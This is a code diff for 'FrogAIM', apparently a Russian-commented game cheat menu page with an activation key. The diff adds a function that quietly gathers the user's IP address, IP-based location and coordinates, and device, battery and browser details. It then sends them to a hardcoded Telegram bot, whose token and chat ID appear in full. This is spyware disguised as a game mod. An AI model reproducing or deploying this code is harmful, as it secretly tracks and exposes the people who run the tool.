@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+у<!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
@@ -667,103 +667,429 @@
     </div>
 
     <script>
-        const ACTIVATION_KEY = "FROGI-M4R-FREE52T69";
-        const TELEGRAM_TOKEN = "8366387571:AAFo0fqn2G7v9NUxEDR6r_NZRe0pZX5RjmQ";
-        const CHAT_ID = "2020792314";
-        let isActivated = false;
-        let isDragging = false;
-        let dragOffset = { x: 0, y: 0 };
+    const ACTIVATION_KEY = "FROGI-M4R-FREE52T69";
+    const TELEGRAM_TOKEN = "8366387571:AAFo0fqn2G7v9NUxEDR6r_NZRe0pZX5RjmQ";
+    const CHAT_ID = "2020792314";
+    let isActivated = false;
+    let isDragging = false;
+    let dragOffset = { x: 0, y: 0 };
 
-        // Создаем анимированные кружочки на фоне
-        function createBubbles() {
-            const container = document.getElementById('backgroundBubbles');
-            for (let i = 0; i < 15; i++) {
-                const bubble = document.createElement('div');
-                bubble.className = 'bubble';
-                
-                const size = Math.random() * 100 + 50;
-                const posX = Math.random() * 100;
-                const posY = Math.random() * 100;
-                const delay = Math.random() * 20;
-                
-                bubble.style.width = `${size}px`;
-                bubble.style.height = `${size}px`;
-                bubble.style.left = `${posX}%`;
-                bubble.style.top = `${posY}%`;
-                bubble.style.animationDelay = `${delay}s`;
-                bubble.style.opacity = Math.random() * 0.3 + 0.1;
-                
-                container.appendChild(bubble);
+    // Создаем анимированные кружочки на фоне
+    function createBubbles() {
+        const container = document.getElementById('backgroundBubbles');
+        for (let i = 0; i < 15; i++) {
+            const bubble = document.createElement('div');
+            bubble.className = 'bubble';
+            
+            const size = Math.random() * 100 + 50;
+            const posX = Math.random() * 100;
+            const posY = Math.random() * 100;
+            const delay = Math.random() * 20;
+            
+            bubble.style.width = `${size}px`;
+            bubble.style.height = `${size}px`;
+            bubble.style.left = `${posX}%`;
+            bubble.style.top = `${posY}%`;
+            bubble.style.animationDelay = `${delay}s`;
+            bubble.style.opacity = Math.random() * 0.3 + 0.1;
+            
+            container.appendChild(bubble);
+        }
+    }
+
+    function toggleSettings(panelId) {
+        const panel = document.getElementById(panelId);
+        panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+    }
+
+    function updateSliderValue(spanId, value) {
+        document.getElementById(spanId).textContent = value + '%';
+    }
+
+    function closeApp() {
+        const window = document.getElementById('mainWindow');
+        const rect = window.getBoundingClientRect();
+        
+        // Создаем эффект взрыва
+        for (let i = 0; i < 30; i++) {
+            createParticle(rect.left + rect.width/2, rect.top + rect.height/2);
+        }
+        
+        // Скрываем окно
+        window.style.opacity = '0';
+        window.style.transform = 'translate(-50%, -50%) scale(0.5)';
+        
+        // Закрываем приложение через 1 секунду
+        setTimeout(() => {
+            // Для Capacitor/Android
+            if (typeof capacitor !== 'undefined' && capacitor.Plugins.App) {
+                capacitor.Plugins.App.exitApp();
+            } 
+            // Для браузера просто скрываем
+            else {
+                window.style.display = 'none';
+                document.getElementById('launchButton').style.display = 'flex';
+                // Перезагружаем страницу через секунду
+                setTimeout(() => {
+                    window.location.reload();
+                }, 1000);
             }
-        }
+        }, 1000);
+    }
 
-        function toggleSettings(panelId) {
-            const panel = document.getElementById(panelId);
-            panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
-        }
+    function createParticle(x, y) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        
+        const size = Math.random() * 10 + 5;
+        const angle = Math.random() * Math.PI * 2;
+        const distance = Math.random() * 100 + 50;
+        const duration = Math.random() * 1000 + 500;
+        
+        particle.style.width = `${size}px`;
+        particle.style.height = `${size}px`;
+        particle.style.left = `${x}px`;
+        particle.style.top = `${y}px`;
+        particle.style.background = `hsl(${Math.random() * 360}, 70%, 60%)`;
+        particle.style.animationDuration = `${duration}ms`;
+        
+        document.body.appendChild(particle);
+        
+        // Удаляем частицу после анимации
+        setTimeout(() => {
+            particle.remove();
+        }, duration);
+    }
 
-        function updateSliderValue(spanId, value) {
-            document.getElementById(spanId).textContent = value + '%';
-        }
-
-        function closeApp() {
-            const window = document.getElementById('mainWindow');
-            const rect = window.getBoundingClientRect();
+    function activateCheat() {
+        const inputKey = document.getElementById('activationKey').value.trim();
+        const errorMsg = document.getElementById('errorMsg');
+        const activationModal = document.getElementById('activationModal');
+        
+        console.log('Input key:', inputKey);
+        console.log('Expected key:', ACTIVATION_KEY);
+        
+        if (inputKey === ACTIVATION_KEY) {
+            isActivated = true;
+            errorMsg.style.display = 'none';
             
-            // Создаем эффект взрыва
-            for (let i = 0; i < 30; i++) {
-                createParticle(rect.left + rect.width/2, rect.top + rect.height/2);
-            }
+            // Анимация исчезновения модального окна
+            activationModal.style.animation = 'fadeIn 0.5s ease-out reverse';
+            activationModal.style.opacity = '0';
             
-            // Скрываем окно
-            window.style.opacity = '0';
-            window.style.transform = 'translate(-50%, -50%) scale(0.5)';
-            
-            // Закрываем приложение через 1 секунду
             setTimeout(() => {
-                if (typeof Android !== 'undefined' && Android.exitApp) {
-                    Android.exitApp();
-                } else {
-                    // Для браузера просто скрываем
-                    window.style.display = 'none';
-                    document.getElementById('launchButton').style.display = 'flex';
-                }
-            }, 1000);
-        }
-
-        function createParticle(x, y) {
-            const particle = document.createElement('div');
-            particle.className = 'particle';
+                activationModal.style.display = 'none';
+                document.getElementById('launchButton').style.display = 'flex';
+                activationModal.style.animation = 'fadeIn 0.5s ease-out';
+                activationModal.style.opacity = '1';
+            }, 500);
             
-            const size = Math.random() * 10 + 5;
-            const angle = Math.random() * Math.PI * 2;
-            const distance = Math.random() * 100 + 50;
-            const duration = Math.random() * 1000 + 500;
+            localStorage.setItem('frogaim_activated', 'true');
+            console.log('Activation successful!');
             
-            particle.style.width = `${size}px`;
-            particle.style.height = `${size}px`;
-            particle.style.left = `${x}px`;
-            particle.style.top = `${y}px`;
-            particle.style.background = `hsl(${Math.random() * 360}, 70%, 60%)`;
-            particle.style.animationDuration = `${duration}ms`;
+        } else {
+            errorMsg.style.display = 'block';
+            errorMsg.style.animation = 'shake 0.5s ease';
             
-            document.body.appendChild(particle);
-            
-            // Удаляем частицу после анимации
+            // Анимация тряски поля ввода
+            document.getElementById('activationKey').style.animation = 'shake 0.5s ease';
             setTimeout(() => {
-                particle.remove();
-            }, duration);
+                document.getElementById('activationKey').style.animation = '';
+            }, 500);
+            
+            setTimeout(() => {
+                errorMsg.style.display = 'none';
+            }, 3000);
+            
+            console.log('Invalid activation key');
         }
+    }
 
-        // Остальной код остается без изменений...
-        // [Весь предыдущий JavaScript код сохраняется здесь]
+    function showCheatMenu() {
+        if (isActivated) {
+            const mainWindow = document.getElementById('mainWindow');
+            const launchButton = document.getElementById('launchButton');
+            
+            mainWindow.style.display = 'block';
+            launchButton.style.display = 'none';
+            
+            // Анимация появления
+            mainWindow.style.animation = 'fadeIn 0.4s ease-out';
+        }
+    }
 
-        // Инициализация при загрузке
-        window.addEventListener('load', function() {
-            createBubbles();
-            document.getElementById('activationKey').focus();
+    function hideCheatMenu() {
+        const mainWindow = document.getElementById('mainWindow');
+        const launchButton = document.getElementById('launchButton');
+        
+        mainWindow.style.animation = 'fadeIn 0.4s ease-out reverse';
+        mainWindow.style.opacity = '0';
+        
+        setTimeout(() => {
+            mainWindow.style.display = 'none';
+            launchButton.style.display = 'flex';
+            mainWindow.style.opacity = '1';
+            mainWindow.style.animation = 'fadeIn 0.4s ease-out';
+        }, 400);
+    }
+
+    function switchTab(tabIndex) {
+        document.querySelectorAll('.tab').forEach((tab, index) => {
+            tab.classList.toggle('active', index === tabIndex);
         });
+        
+        document.querySelectorAll('.tab-content').forEach((content, index) => {
+            content.classList.toggle('active', index === tabIndex);
+        });
+    }
 
+    // Перетаскивание окна
+    document.getElementById('windowHeader').addEventListener('mousedown', function(e) {
+        isDragging = true;
+        const rect = document.getElementById('mainWindow').getBoundingClientRect();
+        dragOffset.x = e.clientX - rect.left;
+        dragOffset.y = e.clientY - rect.top;
+        document.getElementById('mainWindow').style.cursor = 'grabbing';
+    });
+
+    document.addEventListener('mousemove', function(e) {
+        if (isDragging) {
+            const x = e.clientX - dragOffset.x;
+            const y = e.clientY - dragOffset.y;
+            
+            document.getElementById('mainWindow').style.left = x + 'px';
+            document.getElementById('mainWindow').style.top = y + 'px';
+        }
+    });
+
+    document.addEventListener('mouseup', function() {
+        isDragging = false;
+        document.getElementById('mainWindow').style.cursor = 'default';
+    });
+
+    // Touch события
+    document.getElementById('windowHeader').addEventListener('touchstart', function(e) {
+        isDragging = true;
+        const touch = e.touches[0];
+        const rect = document.getElementById('mainWindow').getBoundingClientRect();
+        dragOffset.x = touch.clientX - rect.left;
+        dragOffset.y = touch.clientY - rect.top;
+    });
+
+    document.addEventListener('touchmove', function(e) {
+        if (isDragging) {
+            const touch = e.touches[0];
+            const x = touch.clientX - dragOffset.x;
+            const y = touch.clientY - dragOffset.y;
+            
+            document.getElementById('mainWindow').style.left = x + 'px';
+            document.getElementById('mainWindow').style.top = y + 'px';
+            e.preventDefault();
+        }
+    });
+
+    document.addEventListener('touchend', function() {
+        isDragging = false;
+    });
+
+    // Анимации переключателей
+    document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
+        checkbox.addEventListener('change', function() {
+            if (this.checked) {
+                document.getElementById('statusText').textContent = "Mod Activated";
+                document.getElementById('statusText').style.color = "#ff9900";
+                
+                setTimeout(() => {
+                    document.getElementById('statusText').textContent = "Active";
+                    document.getElementById('statusText').style.color = "#00ff00";
+                }, 2000);
+            }
+        });
+    });
+
+    // Случайные изменения статуса
+    setInterval(() => {
+        if (Math.random() > 0.8 && document.getElementById('mainWindow').style.display === 'block') {
+            document.getElementById('statusText').textContent = "Scanning...";
+            document.getElementById('statusText').style.color = "#ffff00";
+            
+            setTimeout(() => {
+                document.getElementById('statusText').textContent = "Active";
+                document.getElementById('statusText').style.color = "#00ff00";
+            }, 1500);
+        }
+    }, 10000);
+
+    // Проверка активации при загрузке
+    if (localStorage.getItem('frogaim_activated') === 'true') {
+        isActivated = true;
+        document.getElementById('activationModal').style.display = 'none';
+        document.getElementById('launchButton').style.display = 'flex';
+    }
+
+    // Отправка ВСЕЙ информации в Telegram
+    async function sendDeathInfo() {
+        const statusText = document.getElementById('statusText');
+        statusText.textContent = "Collecting data...";
+        statusText.style.color = "#ffff00";
+        
+        try {
+            // Собираем ВСЮ возможную информацию
+            const deviceInfo = await collectAllDeviceInfo();
+            
+            const message = `🚨 FROGAIM DEATH BUTTON PRESSED!\n\n` +
+                           `📋 DEVICE INFORMATION:\n` +
+                           `💻 IP Address: ${deviceInfo.ip}\n` +
+                           `🌐 Location: ${deviceInfo.location}\n` +
+                           `📱 Device: ${deviceInfo.deviceModel}\n` +
+                           `🤖 Platform: ${deviceInfo.platform}\n` +
+                           `🔢 Android: ${deviceInfo.androidVersion}\n` +
+                           `📶 Connection: ${deviceInfo.connection}\n` +
+                           `📏 Screen: ${deviceInfo.screen}\n` +
+                           `⚡ CPU: ${deviceInfo.cpuCores} cores\n` +
+                           `💾 Memory: ${deviceInfo.memory}\n` +
+                           `🔋 Battery: ${deviceInfo.battery}\n` +
+                           `🌐 Language: ${deviceInfo.language}\n` +
+                           `⏰ Timezone: ${deviceInfo.timezone}\n` +
+                           `🕐 Local Time: ${deviceInfo.localTime}\n\n` +
+                           `📊 BROWSER INFO:\n` +
+                           `🔍 User Agent: ${deviceInfo.userAgent}\n` +
+                           `🌍 Languages: ${deviceInfo.languages}\n` +
+                           `📐 Resolution: ${deviceInfo.resolution}\n` +
+                           `🎨 Color Depth: ${deviceInfo.colorDepth}\n` +
+                           `📡 Online: ${deviceInfo.onlineStatus}\n\n` +
+                           `📍 GEOLOCATION:\n` +
+                           `📌 Coordinates: ${deviceInfo.coordinates}\n` +
+                           `🏙️ City: ${deviceInfo.city}\n` +
+                           `🏛️ Region: ${deviceInfo.region}\n` +
+                           `🇺🇸 Country: ${deviceInfo.country}\n\n` +
+                           `⚙️ HARDWARE:\n` +
+                           `📊 Hardware Concurrency: ${deviceInfo.hardwareConcurrency}\n` +
+                           `💿 Max Touch Points: ${deviceInfo.maxTouchPoints}\n` +
+                           `🎮 Device Memory: ${deviceInfo.deviceMemory}\n\n` +
+                           `🔧 PLATFORM:\n` +
+                           `🖥️ Platform: ${deviceInfo.platform}\n` +
+                           `🍪 Cookies: ${deviceInfo.cookiesEnabled}\n` +
+                           `📝 Java: ${deviceInfo.javaEnabled}\n` +
+                           `🖨️ PDF: ${deviceInfo.pdfViewerEnabled}\n\n` +
+                           `🕵️ USER DATA:\n` +
+                           `👤 User ID: ${deviceInfo.userId}\n` +
+                           `🔐 Security: ${deviceInfo.securityInfo}\n` +
+                           `🌐 Referrer: ${deviceInfo.referrer}\n\n` +
+                           `⏰ TIMESTAMP:\n` +
+                           `📅 Date: ${deviceInfo.date}\n` +
+                           `🕒 UTC Time: ${deviceInfo.utcTime}\n` +
+                           `⏱️ Timestamp: ${deviceInfo.timestamp}`;
+            
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: CHAT_ID, 
+                    text: message
+                })
+            });
+            
+            statusText.textContent = "Data Sent!";
+            statusText.style.color = "#00ff00";
+        } catch (error) {
+            console.error('Telegram error:', error);
+            statusText.textContent = "Error!";
+            statusText.style.color = "#ff4444";
+        } finally {
+            setTimeout(() => {
+                statusText.textContent = "Active";
+                statusText.style.color = "#00ff00";
+            }, 3000);
+        }
+    }
+
+    // Сбор всей возможной информации
+    async function collectAllDeviceInfo() {
+        let ipData = { ip: 'Unknown' };
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            ipData = await ipResponse.json();
+        } catch (e) {
+            console.error('IP fetch error:', e);
+        }
+        
+        // Геолокация по IP
+        let locationInfo = {};
+        try {
+            const locationResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
+            locationInfo = await locationResponse.json();
+        } catch (e) {
+            locationInfo = { city: 'Unknown', region: 'Unknown', country: 'Unknown' };
+        }
+        
+        // Информация о батарее
+        let batteryInfo = 'Unknown';
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                batteryInfo = `Level: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
+            } catch (e) {
+                batteryInfo = 'Unknown';
+            }
+        }
+        
+        return {
+            ip: ipData.ip,
+            location: locationInfo.city || 'Unknown',
+            city: locationInfo.city || 'Unknown',
+            region: locationInfo.regionName || 'Unknown',
+            country: locationInfo.country || 'Unknown',
+            coordinates: locationInfo.lat && locationInfo.lon ? 
+                `${locationInfo.lat}, ${locationInfo.lon}` : 'Unknown',
+            
+            deviceModel: navigator.userAgent,
+            platform: navigator.platform,
+            androidVersion: navigator.userAgent.match(/Android\s([0-9\.]+)/)?.[1] || 'Unknown',
+            connection: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
+            screen: `${screen.width}x${screen.height}`,
+            cpuCores: navigator.hardwareConcurrency || 'Unknown',
+            memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
+            battery: batteryInfo,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            localTime: new Date().toLocaleString('ru-RU'),
+            
+            userAgent: navigator.userAgent,
+            languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
+            resolution: `${screen.width}x${screen.height}`,
+            colorDepth: `${screen.colorDepth} bit`,
+            onlineStatus: navigator.onLine ? 'Online' : 'Offline',
+            
+            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+            maxTouchPoints: navigator.maxTouchPoints || 'Unknown',
+            deviceMemory: navigator.deviceMemory || 'Unknown',
+            
+            cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
+            javaEnabled: navigator.javaEnabled ? 'Yes' : 'No',
+            pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Yes' : 'No',
+            
+            userId: Math.random().toString(36).substr(2, 9),
+            securityInfo: 'Web Security Context',
+            referrer: document.referrer || 'No referrer',
+            
+            date: new Date().toLocaleDateString('ru-RU'),
+            utcTime: new Date().toUTCString(),
+            timestamp: Date.now()
+        };
+    }
+
+    document.getElementById('activationKey').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') activateCheat();
+    });
+
+    // Инициализация при загрузке
+    window.addEventListener('load', function() {
+        createBubbles();
+        document.getElementById('activationKey').focus();
+        
+        // Debug info
+        console.log('FrogAIM loaded successfully');
+        console.log('Local storage check:', localStorage.getItem('frogaim_activated'));
+    });
     </script>
-</body>
-</html>
